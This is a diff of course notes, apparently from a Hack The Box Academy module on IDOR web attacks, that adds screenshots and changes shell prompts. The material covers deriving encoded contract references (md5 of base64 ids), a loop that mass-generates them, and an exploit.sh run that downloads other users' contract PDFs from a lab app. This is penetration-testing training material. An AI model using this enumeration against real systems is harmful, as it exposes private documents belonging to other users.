@@ -21,12 +21,16 @@
 
 # Bypassing Encoded References
 
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_contracts.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_contracts.jpg)
+
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_download_contract.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_download_contract.jpg)
+
 ``` php
 contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ echo -n 1 | md5sum
+[!bash!]$ echo -n 1 | md5sum
 
 c4ca4238a0b923820dcc509a6f75849b -
 ```
@@ -42,7 +46,7 @@ function downloadContract(uid) {
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum
+[!bash!]$ echo -n 1 | base64 -w 0 | md5sum
 
 cdd96d3cc73d1dbdaffa03cc6cd7339b -
 ```
@@ -50,7 +54,7 @@ cdd96d3cc73d1dbdaffa03cc6cd7339b -
 ## Mass Enumeration
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
+[!bash!]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
 
 cdd96d3cc73d1dbdaffa03cc6cd7339b
 0b7e7dee87b1c3b98e72131173dfbbbf
@@ -75,8 +79,8 @@ done
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ bash ./exploit.sh
-ndefstathiou@htb[/htb]$ ls -1
+[!bash!]$ bash ./exploit.sh
+[!bash!]$ ls -1
 
 contract_006d1236aee3f92b8322299796ba1989.pdf
 contract_0b24df25fe628797b3a50ae0724d2730.pdf
